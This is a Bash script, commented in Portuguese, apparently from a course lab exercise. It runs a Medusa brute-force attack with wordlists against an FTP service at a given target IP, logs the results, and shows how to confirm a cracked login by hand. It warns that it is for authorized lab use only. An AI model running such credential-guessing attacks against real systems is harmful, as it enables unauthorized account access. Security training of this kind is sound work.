#!/usr/bin/env bash
# ============================================================
#  Bônus A — Força bruta em FTP com Medusa (Kali Linux)
#  Desafio DIO: força bruta SMB com Medusa
#
#  Uso:  ./04-bonus-ftp.sh <IP_DO_ALVO>
#  Ex.:  ./04-bonus-ftp.sh 192.168.56.20
#
#  ⚠️  Somente em laboratório com autorização!
# ============================================================

TARGET="${1:?Uso: $0 <IP_do_alvo>}"

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
USERS="$ROOT/wordlists/users.txt"
PASS="$ROOT/wordlists/passwords.txt"
OUT="$ROOT/results"
mkdir -p "$OUT"

echo "[*] Alvo: $TARGET (vsftpd, porta 21)"

echo
echo "[*] 1/2 — Força bruta FTP com Medusa (módulo ftp)..."
medusa -h "$TARGET" -U "$USERS" -P "$PASS" \
       -M ftp -n 21 -t 4 -v 4 \
       -o "$OUT/medusa-ftp.txt"

echo
echo "[*] 2/2 — Validação manual do acesso:"
echo "    ftp $TARGET"
echo "    login: (usuário encontrado, ex.: msfadmin)"
echo "    senha: (senha encontrada)"
echo "    ftp> ls    ftp> bye"

echo
echo "[+] Log completo em results/medusa-ftp.txt"
